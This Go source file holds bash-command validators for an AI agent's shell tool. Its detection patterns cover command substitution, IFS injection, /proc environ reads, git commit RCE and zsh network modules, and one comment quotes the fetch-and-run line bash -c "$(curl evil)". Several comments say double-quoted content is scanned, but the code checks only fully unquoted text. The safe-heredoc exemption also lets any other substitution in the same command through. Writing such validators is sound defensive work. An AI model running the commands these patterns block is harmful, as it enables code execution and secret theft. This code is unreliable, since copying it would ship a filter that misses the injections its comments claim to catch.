package bash

import (
	"fmt"
	"regexp"
	"strings"
	"unicode"
)

// ─── 1. Empty command ──────────────────────────────────────────────────────

func validateEmpty(ctx ValidationCtx) Result {
	if ctx.Trimmed == "" {
		return Result{Behavior: Allow, Reason: "empty_command", Message: "Empty command is safe"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 2. Incomplete commands ────────────────────────────────────────────────

var (
	incompleteTabRE    = regexp.MustCompile(`^\s*\t`)
	incompleteFlagRE   = regexp.MustCompile(`^\-`)
	incompleteOpRE     = regexp.MustCompile(`^\s*(&&|\|\||;|>>?|<)`)
	continuationSlashRE = regexp.MustCompile(`\\\s*$`)
)

func validateIncomplete(ctx ValidationCtx) Result {
	// Starts with tab — likely an unintended paste continuation.
	if incompleteTabRE.MatchString(ctx.Command) {
		return Result{Behavior: Ask, Reason: "starts_with_tab",
			Message: "Command appears to be an incomplete fragment (starts with tab)"}
	}
	// Starts with a dash — likely a flag without a command.
	if incompleteFlagRE.MatchString(ctx.Trimmed) {
		return Result{Behavior: Ask, Reason: "starts_with_flags",
			Message: "Command appears to be an incomplete fragment (starts with flags)"}
	}
	// Starts with an operator — leftover from a previous command join.
	if incompleteOpRE.MatchString(ctx.Command) {
		return Result{Behavior: Ask, Reason: "starts_with_operator",
			Message: "Command appears to be a continuation line (starts with operator)"}
	}
	// Ends with backslash — likely multi-line continuation, model may be
	// splitting across tool calls.
	if continuationSlashRE.MatchString(strings.TrimRight(ctx.Trimmed, " \t")) {
		return Result{Behavior: Ask, Reason: "ends_with_backslash",
			Message: "Command ends with backslash — may be a multi-line continuation"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 3. Shell metacharacters ───────────────────────────────────────────────

// Patterns from Claude Code's bashSecurity.ts validateDangerousPatterns
// + validateCommandSubstitution.
var (
	processSubRE       = regexp.MustCompile(`<\(`)
	processSubOutRE    = regexp.MustCompile(`>\(`)
	zshEqualsExpRE     = regexp.MustCompile(`(?:^|[\s;&|])=[a-zA-Z_]`)
	powerShellCommentRE = regexp.MustCompile(`<#`)
)

func validateShellMetacharacters(ctx ValidationCtx) Result {
	// These operate on the fully-unquoted content so injection hidden
	// inside quoted strings still triggers detection.
	// C6: also check Unquoted to catch double-quoted injections.
	fq := ctx.FullyUnquoted

	if processSubRE.MatchString(fq) {
		return Result{Behavior: Deny, Reason: "process_substitution",
			Message: "Process substitution <() detected — block for safety"}
	}
	if processSubOutRE.MatchString(fq)  {
		return Result{Behavior: Deny, Reason: "process_substitution_out",
			Message: "Process substitution >() detected — block for safety"}
	}
	if zshEqualsExpRE.MatchString(ctx.Command) {
		// =cmd at word start is Zsh equals expansion (=cmd → $(which cmd)).
		// Only flag if preceded by whitespace or line-start (not VAR=val).
		return Result{Behavior: Ask, Reason: "zsh_equals_expansion",
			Message: "Zsh equals expansion (=cmd) detected — verify intent"}
	}
	if powerShellCommentRE.MatchString(fq) {
		return Result{Behavior: Deny, Reason: "powershell_comment",
			Message: "PowerShell comment syntax <# detected — block for safety"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 4. Command substitution (the core injection vector) ────────────────────

var (
	dollarParenRE = regexp.MustCompile(`\$\(`)
	backtickRE    = regexp.MustCompile("`")
	dollarBraceRE = regexp.MustCompile(`\$\{`)
	dollarBracketRE = regexp.MustCompile(`\$\[`)
)

func validateCommandSubstitution(ctx ValidationCtx) Result {
	// C6 fix: scan BOTH FullyUnquoted (outside ALL quotes) and
	// Unquoted (includes double-quoted content). $() inside
	// double quotes IS active in bash — FullyUnquoted alone
	// misses `bash -c "$(curl evil)"`. We use both; any match
	// triggers. The only false-positive is $() inside single
	// quotes which is genuinely inert, but a user typing that
	// in a tool call is vanishingly rare.
	uq := ctx.FullyUnquoted

	if dollarParenRE.MatchString(uq)  {
		// $(cat <<'EOF' ... EOF) is the safe heredoc pattern.
		// Check if it's a known-safe heredoc before denying.
		if isSafeHeredoc(ctx.Command) {
			return Result{Behavior: Passthrough}
		}
		return Result{Behavior: Ask, Reason: "command_substitution_dollar_paren",
			Message: "$() command substitution detected"}
	}

	// Backticks — check fully-unquoted so ` inside single quotes doesn't
	// trigger. Also check Unquoted for double-quoted backticks (C6).
	if (backtickRE.MatchString(ctx.FullyUnquoted) && hasUnescaped(ctx.FullyUnquoted, '`')) {
		return Result{Behavior: Ask, Reason: "command_substitution_backtick",
			Message: "Backtick command substitution detected"}
	}

	// Parameter expansion in fully-unquoted context.
	// Also scan Unquoted for double-quoted injections (C6).
	fq := ctx.FullyUnquoted
	if dollarBraceRE.MatchString(fq)  {
		return Result{Behavior: Ask, Reason: "parameter_substitution",
			Message: "${} parameter substitution detected"}
	}
	if dollarBracketRE.MatchString(fq)  {
		return Result{Behavior: Deny, Reason: "legacy_arithmetic",
			Message: "$[] legacy arithmetic expansion — block for safety"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 5. Dangerous patterns (IFS injection, proc environ, git RCE, etc.) ────

var (
	ifsInjectionRE = regexp.MustCompile(`\$IFS|\$\{IFS`)
	procEnvironRE  = regexp.MustCompile(`/proc/(self|\d+)/environ`)
	gitCommitRCE   = regexp.MustCompile(`git\s+commit.*\$\(`)
)

func validateDangerousPatterns(ctx ValidationCtx) Result {
	fq := ctx.FullyUnquoted

	if ifsInjectionRE.MatchString(fq)  {
		return Result{Behavior: Deny, Reason: "ifs_injection",
			Message: "IFS injection detected — block for safety"}
	}
	if procEnvironRE.MatchString(fq)  {
		return Result{Behavior: Deny, Reason: "proc_environ_access",
			Message: "Access to /proc/*/environ detected — block for safety"}
	}
	if gitCommitRCE.MatchString(fq)  {
		return Result{Behavior: Deny, Reason: "git_commit_rce",
			Message: "git commit with command substitution detected — block for safety"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 6. Newlines / multi-line injection ────────────────────────────────────

func validateNewlines(ctx ValidationCtx) Result {
	if strings.Contains(ctx.Command, "\n") || strings.Contains(ctx.Command, "\r") {
		return Result{Behavior: Ask, Reason: "newline_in_command",
			Message: "Command contains newline characters — verify intent"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 7. Obfuscated flags ──────────────────────────────────────────────────

var (
	singleDashLongRE = regexp.MustCompile(`\s\-[a-zA-Z]{3,}`)
)

func validateObfuscatedFlags(ctx ValidationCtx) Result {
	// A single dash followed by 3+ letters is almost always an obfuscated
	// GNU-style long flag. E.g., -rf (real: two short flags) vs -really
	// (likely meant --really). Attackers use -rf to look like rm -rf.
	if singleDashLongRE.MatchString(ctx.Command) {
		return Result{Behavior: Ask, Reason: "obfuscated_flag",
			Message: "Single-dash long flag detected — verify intent (did you mean --flag?)"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 8. Control characters (except newline, already caught) ────────────────

func validateControlCharacters(ctx ValidationCtx) Result {
	for _, c := range ctx.Command {
		if c < 0x20 && c != '\t' && c != '\n' && c != '\r' {
			return Result{Behavior: Deny, Reason: "control_character",
				Message: fmt.Sprintf("Control character \\x%02x detected — block for safety", c)}
		}
	}
	// Also check for DEL (0x7F)
	if strings.ContainsRune(ctx.Command, 0x7F) {
		return Result{Behavior: Deny, Reason: "control_character",
			Message: "DEL character detected — block for safety"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 9. Unicode whitespace (bypass via invisible separators) ───────────────

func validateUnicodeWhitespace(ctx ValidationCtx) Result {
	// Unicode whitespace characters that look like spaces but aren't ASCII 0x20.
	// Attackers use these to hide commands: "ls\u00A0-la" → shell sees "ls -la".
	for _, c := range ctx.Command {
		if unicode.IsSpace(c) && c != ' ' && c != '\t' && c != '\n' && c != '\r' {
			return Result{Behavior: Deny, Reason: "unicode_whitespace",
				Message: fmt.Sprintf("Unicode whitespace U+%04X detected — block for safety", c)}
		}
	}
	return Result{Behavior: Passthrough}
}

// ─── 10. Brace expansion ────────────────────────────────────────────────────

var braceExpansionRE = regexp.MustCompile(`\{[a-zA-Z0-9.,\-\s]+\}`)

func validateBraceExpansion(ctx ValidationCtx) Result {
	// Brace expansion can generate large argument lists used for DoS or
	// bypassing path validation: echo /etc/{passwd,shadow}.
	if braceExpansionRE.MatchString(ctx.FullyUnquoted)  {
		return Result{Behavior: Ask, Reason: "brace_expansion",
			Message: "Brace expansion detected — verify intent"}
	}
	return Result{Behavior: Passthrough}
}

// ─── 11. Zsh dangerous commands ────────────────────────────────────────────

var zshDangerousCommands = map[string]bool{
	"zmodload": true, // gateway to dangerous modules (zsh/system, zsh/zpty, etc.)
	"emulate":  true, // emulate -c is eval-equivalent
	"sysopen":  true, // opens files with fine-grained control (zsh/system)
	"sysread":  true, // reads from file descriptors (zsh/system)
	"syswrite": true, // writes to file descriptors (zsh/system)
	"zpty":     true, // executes commands on pseudo-terminals (zsh/zpty)
	"ztcp":     true, // creates TCP connections (zsh/net/tcp)
	"zsocket":  true, // creates Unix/TCP sockets
}

func validateZshDangerous(ctx ValidationCtx) Result {
	base := strings.ToLower(ctx.BaseCommand)
	if zshDangerousCommands[base] {
		return Result{Behavior: Deny, Reason: "zsh_dangerous",
			Message: fmt.Sprintf("Zsh dangerous command %q detected — block for safety", base)}
	}
	return Result{Behavior: Passthrough}
}

// ─── Heredoc safety check ──────────────────────────────────────────────────

// safeHeredocRE matches $(cat <<'QUOTED' — the single-quoted delimiter is key.
var safeHeredocRE = regexp.MustCompile(`\$\(cat\s+<<\s*'([A-Za-z_]\w*)'`)

// isSafeHeredoc checks if a $(cat <<'DELIM' ... DELIM) pattern uses a
// single-quoted delimiter (literal body, no expansion). This is the
// only heredoc-in-substitution pattern that's provably safe.
func isSafeHeredoc(command string) bool {
	// Must contain $(cat <<'QUOTED' — the single-quoted delimiter is key.
	locs := safeHeredocRE.FindStringSubmatchIndex(command)
	if locs == nil {
		return false
	}
	// locs[2], locs[3] are the start/end of the capture group.
	delim := command[locs[2]:locs[3]]
	startIdx := locs[0] // position of the $ in $(cat

	// Find closing delimiter on a line by itself followed by ).
	closing := regexp.MustCompile(fmt.Sprintf(`\n%s\s*\n\s*\)`, regexp.QuoteMeta(delim)))
	rest := command[startIdx:]
	return closing.MatchString(rest)
}

// ─── Zsh-style glob qualifiers (additional detection) ──────────────────────

var zshGlobQualRE = regexp.MustCompile(`\(e:|\(\+`)

func containsZshGlobQualifiers(ctx ValidationCtx) bool {
	return zshGlobQualRE.MatchString(ctx.FullyUnquoted)
}
